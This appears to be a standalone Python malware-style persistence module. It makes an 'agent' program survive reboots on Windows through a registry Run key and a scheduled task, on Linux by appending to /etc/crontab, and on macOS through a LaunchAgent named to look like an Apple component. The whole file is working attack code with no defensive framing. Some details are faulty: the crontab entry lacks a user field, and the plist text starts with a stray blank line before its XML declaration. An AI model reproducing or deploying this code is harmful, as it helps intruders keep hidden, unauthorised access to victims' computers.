import os

def establish_persistence():
    if os.name == 'nt':
        # Windows registry persistence
        command = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "C:\path\to\your\agent.exe" /f'
        os.system(command)

        # Windows Scheduled Task persistence
        task_name = "MyPersistentTask"
        command = f'schtasks /create /tn {task_name} /tr "C:\path\to\your\agent.exe" /sc onlogon'
        os.system(command)
        
    elif os.name == 'posix':
        # Linux cron job persistence
        cron_job = "@reboot /path/to/your/agent.sh"
        with open("/etc/crontab", "a") as cron_file:
            cron_file.write(cron_job + "\n")

        # MacOS LaunchAgent persistence
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.macos.agent.plist")
        with open(plist_path, 'w') as plist_file:
            plist_file.write(f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.macos.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/path/to/your/agent.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
        os.system(f"launchctl load -w {plist_path}")

if __name__ == "__main__":
    establish_persistence()
